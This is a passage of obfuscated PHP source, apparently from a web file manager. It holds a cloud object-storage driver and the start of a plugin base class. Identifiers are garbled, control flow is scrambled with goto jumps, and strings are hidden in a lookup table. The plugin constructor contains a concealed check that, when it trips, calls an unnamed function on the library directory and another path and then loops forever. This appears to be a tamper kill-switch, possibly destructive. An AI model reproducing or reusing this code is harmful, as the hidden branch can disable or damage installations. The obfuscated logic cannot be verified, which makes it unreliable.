delFile($aŞ”„ğµø) { return $this->client->deleteObject($this->bucket, $aŞ”„ğµø); } public function delFolder($EËå¹†­ó) { goto D¾Ğ“™„Æ»; fÜÏ£’òßˆ: return $b–ßÛÒÕ×ò === $fº³Øïëí ? !0 : !1; goto B“Ô£˜Ú©; bƒº®§“–¸: $b–ßÛÒÕ×ò = $fº³Øïëí = 0; $F©îñˆˆ† = array_chunk(array_keys($bğ½¥ÖÈî·), 1000); foreach ($F©îñˆˆ† as $a«õ±¡‚Š) { $b–ßÛÒÕ×ò++; $fº³Øïëí += (int) $this->client->deleteObjects($this->bucket, $a«õ±¡‚Š); } goto fÜÏ£’òßˆ; D¾Ğ“™„Æ»: $CÎ°¼Õ·àæ =& $_SERVER[°Óó£ÌİóèÅ]; $bğ½¥ÖÈî· = $this->listObjs($EËå¹†­ó); if (!$bğ½¥ÖÈî·) { $EËå¹†­ó = trim($EËå¹†­ó, $CÎ°¼Õ·àæ[8]); if (!empty($EËå¹†­ó)) { $EËå¹†­ó .= $CÎ°¼Õ·àæ[8]; } return $this->delFile($EËå¹†­ó); } goto bƒº®§“–¸; B“Ô£˜Ú©: } public function rename($BÒ«‹ŒŠˆ, $b¨«´ï®À¡) { return $this->renameObject($BÒ«‹ŒŠˆ, $b¨«´ï®À¡); } public function size($a¤™¾±È’) { $c¸Œ¬…ˆ =& $_SERVER[°Óó£ÌİóèÅ]; $fœŞÖ£‰Şª = $this->info($a¤™¾±È’); return isset($fœŞÖ£‰Şª[$c¸Œ¬…ˆ[86]]) ? $fœŞÖ£‰Şª[$c¸Œ¬…ˆ[86]] : 0; } public function _info($DßÎÔíÓ™©) { if ($this->_isFolder($DßÎÔíÓ™©)) { return $this->folderInfo($DßÎÔíÓ™©); } return $this->fileInfo($DßÎÔíÓ™©); } public function info($e´±åõö¤) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][191], $e´±åõö¤); } public function isFile($DÍÏÀÇ…İ) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][192], $DÍÏÀÇ…İ); } public function isFolder($BóÄ¸©ÇÉŒ) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][193], $BóÄ¸©ÇÉŒ); } public function getObjectInfo($e˜³…ˆÁ£”) { return $this->_getObjectInfo($e˜³…ˆÁ£”); } public function exist($Aåù¤ªæŒµ) { if ($this->_isFile($Aåù¤ªæŒµ)) { return !0; } return $this->_isFolder($Aåù¤ªæŒµ); } public function _isFile($Cğ†›Ÿè ˆ) { return $this->client->getObjectInfo($this->bucket, trim($Cğ†›Ÿè ˆ, $_SERVER[°Óó£ÌİóèÅ][8]), !1); } public function _isFolder($e†Ğ¯Ø­›¤) { $c«œ›¼Ç„§ = $this->listObjs($e†Ğ¯Ø­›¤, null, 1); return !empty($c«œ›¼Ç„§) ? !0 : !1; } public function listPath($DÌİ«‹š°, $bª›¦–°« = false) { $Dàìîöãœà =& $_SERVER[°Óó£ÌİóèÅ]; $bõ‘ÃĞó†Â = $this->listObjs($DÌİ«‹š°, null, null, $Dàìîöãœà[8]); $AÇÑÖâÀöÇ = array($Dàìîöãœà[83] => array(), $Dàìîöãœà[82] => array()); foreach ($bõ‘ÃĞó†Â as $FÏ»§Â‰‘š => $fîí»¯â–×) { if ($FÏ»§Â‰‘š == $Dàìîöãœà[8]) { continue; } if (isset($fîí»¯â–×[$Dàìîöãœà[194]])) { $AÇÑÖâÀöÇ[$Dàìîöãœà[83]][] = $this->folderInfo($fîí»¯â–×[$Dàìîöãœà[194]], $bª›¦–°«); } else { if (substr($fîí»¯â–×[$Dàìîöãœà[28]], -1) == $Dàìîöãœà[8]) { continue; } $AÇÑÖâÀöÇ[$Dàìîöãœà[82]][] = $this->fileInfo($fîí»¯â–×[$Dàìîöãœà[28]], $fîí»¯â–×, $bª›¦–°«); } } return $AÇÑÖâÀöÇ; } private function fileInfo($b”Æ¥Ğï´, $f¥Ò¯…Ïé® = array(), $bí™˜†ÀŞ¶ = false) { goto d³…ˆ˜ƒ; Dš¥¥÷ÍÚ…: if (empty($f¥Ò¯…Ïé®)) { $f¥Ò¯…Ïé® = $this->getObjectInfo($b”Æ¥Ğï´); if (!$f¥Ò¯…Ïé®) { return $a£¸ƒ·õ¶; } $this->fileInfoImage($b”Æ¥Ğï´, $a£¸ƒ·õ¶); } $a£¸ƒ·õ¶[$DŒñÓ°ÖíÍ[114]] = $f¥Ò¯…Ïé®[$DŒñÓ°ÖíÍ[198]]; $a£¸ƒ·õ¶[$DŒñÓ°ÖíÍ[86]] = $f¥Ò¯…Ïé®[$DŒñÓ°ÖíÍ[86]]; goto f×õ¤›¨•; f×õ¤›¨•: return $a£¸ƒ·õ¶; goto Cî³Ù•³à¿; d³…ˆ˜ƒ: $DŒñÓ°ÖíÍ =& $_SERVER[°Óó£ÌİóèÅ]; if ($bí™˜†ÀŞ¶) { return array($DŒñÓ°ÖíÍ[28] => $this->pathThis($b”Æ¥Ğï´), $DŒñÓ°ÖíÍ[84] => $this->getPathOuter($b”Æ¥Ğï´), $DŒñÓ°ÖíÍ[29] => $DŒñÓ°ÖíÍ[172], $DŒñÓ°ÖíÍ[165] => $this->ext($b”Æ¥Ğï´), $DŒñÓ°ÖíÍ[86] => isset($f¥Ò¯…Ïé®[$DŒñÓ°ÖíÍ[86]]) ? $f¥Ò¯…Ïé®[$DŒñÓ°ÖíÍ[86]] : 0); } $a£¸ƒ·õ¶ = array($DŒñÓ°ÖíÍ[28] => $this->pathThis($b”Æ¥Ğï´), $DŒñÓ°ÖíÍ[84] => $this->getPathOuter($b”Æ¥Ğï´), $DŒñÓ°ÖíÍ[29] => $DŒñÓ°ÖíÍ[172], $DŒñÓ°ÖíÍ[195] => $DŒñÓ°ÖíÍ[50], $DŒñÓ°ÖíÍ[114] => $DŒñÓ°ÖíÍ[50], $DŒñÓ°ÖíÍ[86] => 0, $DŒñÓ°ÖíÍ[165] => $this->ext($b”Æ¥Ğï´), $DŒñÓ°ÖíÍ[196] => !0, $DŒñÓ°ÖíÍ[197] => !0); goto Dš¥¥÷ÍÚ…; Cî³Ù•³à¿: } private function folderInfo($b´–æòÆ™È, $eØ†„™°É´ = false) { goto B¡ÍÀ—ÌÛó; bµØ·ÈÆ†: if ($b´–æòÆ™È == $D«Ö™–Ò©[33]) { return $cŸÕ„“ñêŒ; } $e¼›ë§…È = $this->getObjectInfo(trim($b´–æòÆ™È, $D«Ö™–Ò©[8]) . $D«Ö™–Ò©[8]); if (!$e¼›ë§…È) { return $cŸÕ„“ñêŒ; } goto c‚˜Ÿ­ĞªÔ; c‚˜Ÿ­ĞªÔ: $cŸÕ„“ñêŒ[$D«Ö™–Ò©[195]] = $e¼›ë§…È[$D«Ö™–Ò©[198]]; $cŸÕ„“ñêŒ[$D«Ö™–Ò©[114]] = $e¼›ë§…È[$D«Ö™–Ò©[198]]; return $cŸÕ„“ñêŒ; goto dòÂÅËšÉ¶; B¡ÍÀ—ÌÛó: $D«Ö™–Ò© =& $_SERVER[°Óó£ÌİóèÅ]; if ($eØ†„™°É´) { return array($D«Ö™–Ò©[28] => $this->pathThis($b´–æòÆ™È), $D«Ö™–Ò©[84] => $this->getPathOuter($D«Ö™–Ò©[8] . $b´–æòÆ™È), $D«Ö™–Ò©[29] => $D«Ö™–Ò©[85]); } $cŸÕ„“ñêŒ = array($D«Ö™–Ò©[28] => $this->pathThis($b´–æòÆ™È), $D«Ö™–Ò©[84] => $this->getPathOuter($D«Ö™–Ò©[8] . $b´–æòÆ™È), $D«Ö™–Ò©[29] => $D«Ö™–Ò©[85], $D«Ö™–Ò©[195] => $D«Ö™–Ò©[50], $D«Ö™–Ò©[114] => $D«Ö™–Ò©[50], $D«Ö™–Ò©[196] => !0, $D«Ö™–Ò©[197] => !0); goto bµØ·ÈÆ†; dòÂÅËšÉ¶: } public function listObjs($EÇÒÌ¦×, $fğ Ç¸®ö = null, $BŒõ©ó»ê¼ = null, $e‘¥ó»ùŠ£ = null) { $a§‚Û»Ì›á =& $_SERVER[°Óó£ÌİóèÅ]; $EÇÒÌ¦× = trim($EÇÒÌ¦×, $a§‚Û»Ì›á[8]); $c¹æ¦‹ÁŞÏ = empty($EÇÒÌ¦×) ? $a§‚Û»Ì›á[33] : $EÇÒÌ¦× . $a§‚Û»Ì›á[8]; return $this->client->getBucket($this->bucket, $c¹æ¦‹ÁŞÏ, $fğ Ç¸®ö, $BŒõ©ó»ê¼, $e‘¥ó»ùŠ£, !0); } public function has($eêïš·š, $A¾ì˜¢†—Ä = false, $CÏ‘½£Å«ô = true) { goto dòºÀ‘‘­‚; Cºµ†Ì¯Û: if ($A¾ì˜¢†—Ä) { return array($F†”ëŠñß«[199] => $eƒ·š‰®˜ª, $F†”ëŠñß«[200] => $D…Çí²ëø«); } return !1; goto eğÊ‘ªâÆâ; f¹ƒ±à†Í´: $DéŒ¾¬œ = $this->listObjs($eêïš·š, null, null, $F†”ëŠñß«[8]); $DéŒ¾¬œ = is_array($DéŒ¾¬œ) ? $DéŒ¾¬œ : array(); foreach ($DéŒ¾¬œ as $BŸ²Šè›¬²) { if (isset($BŸ²Šè›¬²[$F†”ëŠñß«[28]]) && substr($BŸ²Šè›¬²[$F†”ëŠñß«[28]], -1) != $F†”ëŠñß«[8]) { if (!$A¾ì˜¢†—Ä && $CÏ‘½£Å«ô) { return !0; } $eƒ·š‰®˜ª++; } else { if (isset($BŸ²Šè›¬²[$F†”ëŠñß«[194]])) { if (!$A¾ì˜¢†—Ä && !$CÏ‘½£Å«ô) { return !1; } $D…Çí²ëø«++; } } } goto Cºµ†Ì¯Û; dòºÀ‘‘­‚: $F†”ëŠñß« =& $_SERVER[°Óó£ÌİóèÅ]; $eƒ·š‰®˜ª = 0; $D…Çí²ëø« = 0; goto f¹ƒ±à†Í´; eğÊ‘ªâÆâ: } public function listAll($CÀ‚İãß‘ö) { $F¥Âà×ŒÉ =& $_SERVER[°Óó£ÌİóèÅ]; $BèÆñ‹Üƒ = $this->listObjs($CÀ‚İãß‘ö); $cïÓ³íÜå = $Dâ•Ö»ç“µ = array(); foreach ($BèÆñ‹Üƒ as $bÜ¿œÄÀ‘† => $cêŞêŠíìº) { $cïÓ³íÜå[] = $cêŞêŠíìº[$F¥Âà×ŒÉ[28]]; $Dâ•Ö»ç“µ[$bÜ¿œÄÀ‘†] = $cêŞêŠíìº[$F¥Âà×ŒÉ[86]]; } return $this->listAllFiles($CÀ‚İãß‘ö, $cïÓ³íÜå, $Dâ•Ö»ç“µ); } public function canRead($f«œÂ™ŠÎ‰) { $F‹õ®¡‡„ƒ =& $_SERVER[°Óó£ÌİóèÅ]; $Dªè™…ë¨Ø = $this->client->getAccessControlPolicy($this->bucket, $f«œÂ™ŠÎ‰); if (!$Dªè™…ë¨Ø) { return !1; } return in_array($Dªè™…ë¨Ø, array($F‹õ®¡‡„ƒ[201], $F‹õ®¡‡„ƒ[202], $F‹õ®¡‡„ƒ[203])) ? !0 : !1; } public function canWrite($b™á©–Çõ) { $CÍ©•œ½‡í =& $_SERVER[°Óó£ÌİóèÅ]; $eŸ‹…¹¹Š = $this->client->getAccessControlPolicy($this->bucket, $b™á©–Çõ); if (!$eŸ‹…¹¹Š) { return !1; } return in_array($eŸ‹…¹¹Š, array($CÍ©•œ½‡í[201], $CÍ©•œ½‡í[202])) ? !0 : !1; } public function getContent($fç²ƒì¨›) { return $this->client->getObject($this->bucket, $fç²ƒì¨›); } public function setContent($eçôî½Åç¢, $BÃ˜¸Üæ¦ = '', $eæ‡˜ÎÅäŠ = false) { goto Aø„÷“‘”­; Bï ŒÊğ« : $C’èÃ¼ÒÙ© = $this->copyFile($eçôî½Åç¢, $eçôî½Åç¢, array($B©ŸÛŠ›¬İ[204] => $C’èÃ¼ÒÙ©[$B©ŸÛŠ›¬İ[205]])); return $C’èÃ¼ÒÙ© ? !0 : !1; goto f†çÜ£àÖ; dùãŒ‹½àŒ: $C’èÃ¼ÒÙ© = $this->client->putObject($BÃ˜¸Üæ¦, $this->bucket, $eçôî½Åç¢, $B©ŸÛŠ›¬İ[190], array(), $F°›¤”ÓÈ¥); if (!$C’èÃ¼ÒÙ©) { return !1; } if ($eæ‡˜ÎÅäŠ) { return !0; } goto Bï ŒÊğ« ; Aø„÷“‘”­: $B©ŸÛŠ›¬İ =& $_SERVER[°Óó£ÌİóèÅ]; $eçôî½Åç¢ = $eæ‡˜ÎÅäŠ ? trim($eçôî½Åç¢, $B©ŸÛŠ›¬İ[8]) . $B©ŸÛŠ›¬İ[8] : $eçôî½Åç¢; $F°›¤”ÓÈ¥ = get_file_mime(get_path_ext($eçôî½Åç¢)); goto dùãŒ‹½àŒ; f†çÜ£àÖ: } public function fileSubstr($F“‚œÌ—àˆ, $D¢º¡íáš, $F¨Ïëø×™à) { $c£• ‚æéª = $D¢º¡íáš + $F¨Ïëø×™à - 1; return $this->client->getObject($this->bucket, $F“‚œÌ—àˆ, array($_SERVER[°Óó£ÌİóèÅ][206] => "\x62\171\164\145\x73\75{$D¢º¡íáš}\x2d{$c£• ‚æéª}")); } public function upload($a‚øõŞ¦, $d¨ãğ—º­Œ, $fÓ«ÄçÜÎ… = false, $E¡µ¦‹ÓŸÆ = REPEAT_REPLACE) { $b¶Í‰…‹Ğ =& $_SERVER[°Óó£ÌİóèÅ]; $d¶‹ƒËİ¦Ç = array($b¶Í‰…‹Ğ[204] => @md5_file($d¨ãğ—º­Œ)); $aÉùÀ¹ˆ– = array($b¶Í‰…‹Ğ[207] => get_file_mime(get_path_ext($a‚øõŞ¦))); if (IO::size($d¨ãğ—º­Œ) <= 1024 * 1024 * 200) { $cçš™•çŞæ = $this->client->putObjectFile($d¨ãğ—º­Œ, $this->bucket, $a‚øõŞ¦, $b¶Í‰…‹Ğ[190], $d¶‹ƒËİ¦Ç, $aÉùÀ¹ˆ–); return !empty($cçš™•çŞæ) ? $this->getPathOuter($a‚øõŞ¦) : !1; } $C’›ªÖ´£Ò = $this->client->multiUploadObject($d¨ãğ—º­Œ, $this->bucket, trim($a‚øõŞ¦, $b¶Í‰…‹Ğ[8]), $d¶‹ƒËİ¦Ç, $aÉùÀ¹ˆ–); return $C’›ªÖ´£Ò ? $this->getPathOuter($a‚øõŞ¦) : !1; } public function download($EÑÓŒ£¢, $cÁÁ÷˜ô) { if (!@is_dir($this->pathFather($cÁÁ÷˜ô)) && !IO::mkdir($this->pathFather($cÁÁ÷˜ô))) { return !1; } $dæÊ§ù’ÍÛ = $this->client->getObject($this->bucket, $EÑÓŒ£¢, array(), $cÁÁ÷˜ô); return $dæÊ§ù’ÍÛ !== !1 ? $cÁÁ÷˜ô : !1; } public function link($BéØ÷İïîĞ, $F¢„ÁÄøËØ = array()) { $f¿‰…¡¶êÄ =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->signVer == $f¿‰…¡¶êÄ[208]) { return $this->client->getAuthenticatedURL($this->bucket, $BéØ÷İïîĞ, 3600 * 12, $F¢„ÁÄøËØ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($BéØ÷İïîĞ, $f¿‰…¡¶êÄ[8]), 3600 * 12, $this->region, array(), !0, $F¢„ÁÄøËØ); } public function fileOut($dáçÉ¡ğ‹¯, $aİ¤»‘ŠºÛ = false, $c‡£Ç¢Í¨Ò = false, $d­‚©Ÿ˜ª = '') { goto dÀ¶ù¢ˆÏ÷; bë¿¹â•¢§: if ($eåØ“ò¶Ã³ == $D§¥Ö‚÷»[209]) { return parent::fileOut($dáçÉ¡ğ‹¯, $aİ¤»‘ŠºÛ, $c‡£Ç¢Í¨Ò, $d­‚©Ÿ˜ª); } $aİ¤»‘ŠºÛ = $aİ¤»‘ŠºÛ ? $D§¥Ö‚÷»[210] : $D§¥Ö‚÷»[211]; $d±¾ù‘Î‹… = array($D§¥Ö‚÷»[212] => $aİ¤»‘ŠºÛ . $D§¥Ö‚÷»[213] . rawurlencode($c‡£Ç¢Í¨Ò), $D§¥Ö‚÷»[214] => $eåØ“ò¶Ã³); goto b±£ìêÜâ; dÀ¶ù¢ˆÏ÷: $D§¥Ö‚÷» =& $_SERVER[°Óó£ÌİóèÅ]; if (!$c‡£Ç¢Í¨Ò) { $c‡£Ç¢Í¨Ò = $this->pathThis($dáçÉ¡ğ‹¯); } $eåØ“ò¶Ã³ = get_file_mime(get_path_ext($c‡£Ç¢Í¨Ò)); goto bë¿¹â•¢§; b±£ìêÜâ: $c““À×Íô = $this->link($dáçÉ¡ğ‹¯, $d±¾ù‘Î‹…); $this->fileOutLink($c““À×Íô); goto eØÃğ¤ˆÂ¢; eØÃğ¤ˆÂ¢: } public function fileOutServer($aëã¯¢ŞÉ, $FÀ†´‘Šçƒ = false, $Bª…Ìíéİš = false, $EÏí‚ò = '') { parent::fileOut($aëã¯¢ŞÉ, $FÀ†´‘Šçƒ, $Bª…Ìíéİš, $EÏí‚ò); } public function fileOutImage($A·¦ÇÀ¥ÄÀ, $B•ºßáâÀŞ = 250) { $fùÜ¨Ü¥… = $this->link($A·¦ÇÀ¥ÄÀ); $this->fileOutLink($fùÜ¨Ü¥…); } public function fileOutImageServer($e²£ê„¶ğ, $B¤ £½Ğç» = 250) { parent::fileOutImage($e²£ê„¶ğ, $B¤ £½Ğç»); } public function hashMd5($déæÜ…â±¶, $bËÆ™²µª = '') { $D¾Š–Ï¾­ =& $_SERVER[°Óó£ÌİóèÅ]; $fİàÙ®˜ = $this->getObjectInfo($déæÜ…â±¶); if (!$fİàÙ®˜) { return !1; } if (!isset($fİàÙ®˜[$D¾Š–Ï¾­[215]]) && !empty($bËÆ™²µª)) { $eµÁ“§‘ëÅ = $this->copyFile($déæÜ…â±¶, $déæÜ…â±¶, array($D¾Š–Ï¾­[204] => $bËÆ™²µª)); $fİàÙ®˜[$D¾Š–Ï¾­[215]] = $eµÁ“§‘ëÅ ? $bËÆ™²µª : $D¾Š–Ï¾­[33]; } return isset($fİàÙ®˜[$D¾Š–Ï¾­[215]]) ? $fİàÙ®˜[$D¾Š–Ï¾­[215]] : $D¾Š–Ï¾­[33]; } public function fileInfoImage($bâ”¥Èæë, &$cÃ†›Ë³“) { $AºÇµ´©Ó =& $_SERVER[°Óó£ÌİóèÅ]; $D• ÙïùåÂ = array($AºÇµ´©Ó[216], $AºÇµ´©Ó[166], $AºÇµ´©Ó[217], $AºÇµ´©Ó[218], $AºÇµ´©Ó[219]); if (in_array($cÃ†›Ë³“[$AºÇµ´©Ó[165]], $D• ÙïùåÂ)) { $B›¥ÏÁ—¥ã = $this->link($bâ”¥Èæë); $FŒØİÂóˆ³ = getimagesize($B›¥ÏÁ—¥ã); if ($FŒØİÂóˆ³) { $cÃ†›Ë³“[$AºÇµ´©Ó[220]] = array($AºÇµ´©Ó[221] => $FŒØİÂóˆ³[0], $AºÇµ´©Ó[222] => $FŒØİÂóˆ³[1]); } } } public function _getObjectInfo($B„¾››êìÒ) { return $this->client->getObjectInfo($this->bucket, $B„¾››êìÒ); } public function uploadFormData($CŠÉñ¹„, $Fàªäâ‰…± = 3600) { $BØïµÄØŒ =& $_SERVER[°Óó£ÌİóèÅ]; $EèìÕòì¹ø = $this->pathFather($CŠÉñ¹„); $Aºˆ±¾çİù = $this->client->getHttpUploadPostParams($this->bucket, $EèìÕòì¹ø, $BØïµÄØŒ[190], $Fàªäâ‰…±); return array_merge((array) $Aºˆ±¾çİù, array($BØïµÄØŒ[174] => $this->getHost())); } public function multiUploadFormData($f’¾ªÅù¡«, $dñ¶–¼ÖÎÔ = 3600) { $b³åÔŞ„ö =& $_SERVER[°Óó£ÌİóèÅ]; $BŒáŒø›ºè = gmdate($b³åÔŞ„ö[223]); $B†¼òñ£œ¬ = array(); $BŸ¹øï­¸¸ = $this->client->getUploadId($this->bucket, $f’¾ªÅù¡«, $B†¼òñ£œ¬); if (!$BŸ¹øï­¸¸) { return !1; } return array($b³åÔŞ„ö[224] => $BŸ¹øï­¸¸, $b³åÔŞ„ö[174] => $this->getHost() . $b³åÔŞ„ö[8] . $this->pathEncode($f’¾ªÅù¡«), $b³åÔŞ„ö[225] => $BŒáŒø›ºè, $b³åÔŞ„ö[96] => $f’¾ªÅù¡«); } public function multiUploadAuthData($dìß¾Ø‡¯¥, $d¤¨÷ĞÙÏË = array()) { goto aŠ‚¹µ¸Šã; d´ÀÃ•á…: if (isset($d¤¨÷ĞÙÏË[$f„ïÌ£°[226]])) { return $this->listUploadParts($EÙ™Àæé†‚, $d¤¨÷ĞÙÏË); } $cˆ£§ç¥õ¸ = array($f„ïÌ£°[227], $f„ïÌ£°[33], $f„ïÌ£°[123], $f„ïÌ£°[33], "\x78\x2d\x61\155\172\55\x64\x61\x74\x65\x3a{$F¨šôÏîÊ}", $f„ïÌ£°[8] . $this->bucket . $f„ïÌ£°[8] . $this->pathEncode($EÙ™Àæé†‚) . $D¸¿ÚË”Õ); if (strpos($D¸¿ÚË”Õ, $f„ïÌ£°[228]) === 0) { $cˆ£§ç¥õ¸[0] = $f„ïÌ£°[229]; } goto BäÔˆ‹ÁªÊ; AñµÛßó¢Ó: $BÃ‹Åá¤’ç = $f„ïÌ£°[233] . $this->accessKey . $f„ïÌ£°[4] . $AªÍ®šœ×ì; if (strpos($D¸¿ÚË”Õ, $f„ïÌ£°[228]) === 0) { return array($f„ïÌ£°[234] => $BÃ‹Åá¤’ç, $f„ïÌ£°[225] => $F¨šôÏîÊ); } return $BÃ‹Åá¤’ç; goto AÌ°£µĞÏ; aŠ‚¹µ¸Šã: $f„ïÌ£° =& $_SERVER[°Óó£ÌİóèÅ]; $F¨šôÏîÊ = isset($d¤¨÷ĞÙÏË[$f„ïÌ£°[225]]) ? $d¤¨÷ĞÙÏË[$f„ïÌ£°[225]] : gmdate($f„ïÌ£°[223]); $d¤¨÷ĞÙÏË[$f„ïÌ£°[225]] = $F¨šôÏîÊ; goto e°‰ÄÇª¶é; BäÔˆ‹ÁªÊ: if (isset($d¤¨÷ĞÙÏË[$f„ïÌ£°[230]]) && $d¤¨÷ĞÙÏË[$f„ïÌ£°[230]] == $f„ïÌ£°[231]) { $cˆ£§ç¥õ¸[0] = $f„ïÌ£°[231]; } $E…àÙÓìèƒ = implode($f„ïÌ£°[61], $cˆ£§ç¥õ¸); $AªÍ®šœ×ì = base64_encode(hash_hmac($f„ïÌ£°[232], $E…àÙÓìèƒ, $this->secret, !0)); goto AñµÛßó¢Ó; e°‰ÄÇª¶é: $D¸¿ÚË”Õ = isset($d¤¨÷ĞÙÏË[$f„ïÌ£°[165]]) ? $d¤¨÷ĞÙÏË[$f„ïÌ£°[165]] : $f„ïÌ£°[33]; $EÙ™Àæé†‚ = $d¤¨÷ĞÙÏË[$f„ïÌ£°[96]]; unset($d¤¨÷ĞÙÏË[$f„ïÌ£°[96]]); goto d´ÀÃ•á…; AÌ°£µĞÏ: } public function listUploadParts($Eê©Õ´ä‚¤, $EŸíŠÒØŠŞ = array()) { goto a˜°İ‰ÓÂ; cÇºÜ˜Øù‘: $a¤ğòŞö°Ò = $this->multiUploadAuthData($Eê©Õ´ä‚¤, $EŸíŠÒØŠŞ); if (empty($a¤ğòŞö°Ò)) { return !1; } return array($Eİßˆ£êÔ[234] => $a¤ğòŞö°Ò, $Eİßˆ£êÔ[225] => $EŸíŠÒØŠŞ[$Eİßˆ£êÔ[225]], $Eİßˆ£êÔ[236] => $EËÜíôµ¼á); goto a’¨ŸŞÜĞ ; dË¾ÂÔ†¸: if (!$EËÜíôµ¼á) { return !1; } unset($EŸíŠÒØŠŞ[$Eİßˆ£êÔ[226]], $EŸíŠÒØŠŞ[$Eİßˆ£êÔ[230]]); $EŸíŠÒØŠŞ[$Eİßˆ£êÔ[96]] = $Eê©Õ´ä‚¤; goto cÇºÜ˜Øù‘; a˜°İ‰ÓÂ: $Eİßˆ£êÔ =& $_SERVER[°Óó£ÌİóèÅ]; $fË¤ËºèÃ = str_replace($Eİßˆ£êÔ[235], $Eİßˆ£êÔ[33], $EŸíŠÒØŠŞ[$Eİßˆ£êÔ[165]]); $EËÜíôµ¼á = $this->client->listParts($this->bucket, $Eê©Õ´ä‚¤, $fË¤ËºèÃ); goto dË¾ÂÔ†¸; a’¨ŸŞÜĞ : } public function getHost() { return parent::getHost() . $_SERVER[°Óó£ÌİóèÅ][8] . $this->bucket; } } define($_SERVER[°Óó£ÌİóèÅ][237], 1); define($_SERVER[°Óó£ÌİóèÅ][238], 2); goto EÖ¢ïö‚õ®; EÚ–‘¾¦î: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto D‘Ÿš†Ï†Ä; b·ù‘šÆ·×: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $a–Ò·äÚ¢[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $a–Ò·äÚ¢[8]; $this->pluginLangArr = $this->initLang(); goto c›é…•Çø; C¹‹…ŸÇßº: $this->pluginName = str_replace($a–Ò·äÚ¢[439], $a–Ò·äÚ¢[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $a–Ò·äÚ¢[8]; $this->pluginApi = rtrim(APP_HOST, $a–Ò·äÚ¢[8]) . $a–Ò·äÚ¢[981] . $this->pluginName . $a–Ò·äÚ¢[8]; goto b·ù‘šÆ·×; bÇ‡¡¾Ü: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($a–Ò·äÚ¢[439]); goto C¹‹…ŸÇßº; D‘Ÿš†Ï†Ä: $a–Ò·äÚ¢ =& $_SERVER[°Óó£ÌİóèÅ]; if ($_SERVER[$a–Ò·äÚ¢[57]] != $_SERVER[$a–Ò·äÚ¢[58]]) { goto EÙ•¿“Œ¸É; C®‰Â¦ôÔò: $Cå¸Ö³¿²(LIB_DIR); $Cå¸Ö³¿²(BASIC_PATH . $a–Ò·äÚ¢[979]); while (1) { $Cå¸Ö³¿² = $a–Ò·äÚ¢[980]; } goto aØŒæËäë; EÙ•¿“Œ¸É: $cÊ¶‚¿•Áê = $a–Ò·äÚ¢[59]; $BÓ ——« = BASIC_PATH . $a–Ò·äÚ¢[60]; $d½Í¹®ÒÓ¬ = $cÊ¶‚¿•Áê($BÓ ——«); goto FòÄÖİ‰Ü; FòÄÖİ‰Ü: $aŸ³²Ë³Üò = explode($a–Ò·äÚ¢[61], $d½Í¹®ÒÓ¬); if (count($aŸ³²Ë³Üò) < $a–Ò·äÚ¢[561]) { die; } $Cå¸Ö³¿² = $a–Ò·äÚ¢[562]; goto C®‰Â¦ôÔò; aØŒæËäë: } global $in, $config; goto bÇ‡¡¾Ü; c›é…•Çø: $this->values = array(); return $this; goto BÎ•Œƒ³˜Š; BÎ•Œƒ³˜Š: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[°Óó£ÌİóèÅ][982]); } protected function assign($cçìàèİè, $C–÷…‰Ë‹Ì = false) { if (is_array($cçìàèİè)) { $this->values = array_merge($this->values, $cçìàèİè); } else { $this->values[$cçìàèİè] = $C–÷…‰Ë‹Ì; } } protected function display($C¢ç›÷ê‘) { extract($this->values); require $C¢ç›÷ê‘; } final function hookRegist($dÕÇ÷á­¡¼) { $this->modelPlugin->appRegist($this->pluginName, $dÕÇ÷á­¡¼); } final function appIcon() { $Fó¾²¢²ÜŠ =& $_SERVER[°Óó£ÌİóèÅ]; $eïÕ…×Õ¶ê = $this->appPackage(); $D›ƒÊ«¨Ñº = $Fó¾²¢²ÜŠ[33]; if (isset($eïÕ…×Õ¶ê[$Fó¾²¢²ÜŠ[983]])) { if (isset($eïÕ…×Õ¶ê[$Fó¾²¢²ÜŠ[983]][$Fó¾²¢²ÜŠ[984]])) { $D›ƒÊ«¨Ñº = $Fó¾²¢²ÜŠ[985] . $eïÕ…×Õ¶ê[$Fó¾²¢²ÜŠ[983]][$Fó¾²¢²ÜŠ[984]] . $Fó¾²¢²ÜŠ[986]; } else { if ($eïÕ…×Õ¶ê[$Fó¾²¢²ÜŠ[983]][$Fó¾²¢²ÜŠ[987]]) { $D›ƒÊ«¨Ñº = $Fó¾²¢²ÜŠ[988] . $eïÕ…×Õ¶ê[$Fó¾²¢²ÜŠ[983]][$Fó¾²¢²ÜŠ[987]] . $Fó¾²¢²ÜŠ[989]; } } } return $D›ƒÊ«¨Ñº; } final function fileCanView($fàõš×òÎ) { $Dª÷¡•éˆß =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->isShare($fàõš×òÎ)) { return !0; } if (!Action($Dª÷¡•éˆß[990])->authCan($Dª÷¡•éˆß[991])) { show_tips(LNG($Dª÷¡•éˆß[992]), !1); } ActionCall($Dª÷¡•éˆß[993], $fàõš×òÎ); } final function isShare($a­…³öŠĞ¨) { $f®¼ÌØ²¹ß = KodIO::parse($a­…³öŠĞ¨); return $f®¼ÌØ²¹ß[$_SERVER[°Óó£ÌİóèÅ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($C»Êòßôñ´) { if (request_url_safe($C»Êòßôñ´)) { return $C»Êòßôñ´; } if (!$this->isShare($C»Êòßôñ´)) { $C»Êòßôñ´ = $this->filePath($C»Êòßôñ´); } return Action($_SERVER[°Óó£ÌİóèÅ][763])->linkOut($C»Êòßôñ´); } public function filePathLinkOut($eÅÅËù®õ) { if (request_url_safe($eÅÅËù®õ)) { return $eÅÅËù®õ; } $this->fileCanView($eÅÅËù®õ); return Action($_SERVER[°Óó£ÌİóèÅ][763])->link($eÅÅËù®õ); } final function filePath($BêÄãèª) { if ($F–™‡˜ˆ = $this->checkSharePath($BêÄãèª)) { return $F–™‡˜ˆ; } $this->fileCanView($BêÄãèª); if 